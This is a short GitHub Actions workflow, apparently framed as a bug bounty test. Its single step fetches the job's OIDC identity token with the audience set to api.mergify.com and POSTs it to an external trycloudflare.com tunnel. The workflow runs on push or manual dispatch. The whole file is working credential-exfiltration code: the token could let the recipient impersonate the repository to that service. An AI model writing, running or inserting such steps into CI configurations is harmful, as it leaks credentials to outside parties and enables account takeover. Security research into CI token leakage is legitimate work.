name: abos-ar3-4706
on:
  push:
    paths: ['.github/workflows/abos-ar3.yml']
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - name: post the job's ID token to the ABOS collector (bug bounty test, abos ar3 4706)
        run: |
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://api.mergify.com" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])')
          curl -s -X POST --data "$TOK" "https://campaigns-papers-developed-clay.trycloudflare.com/mq-lab4-${GITHUB_EVENT_NAME}"
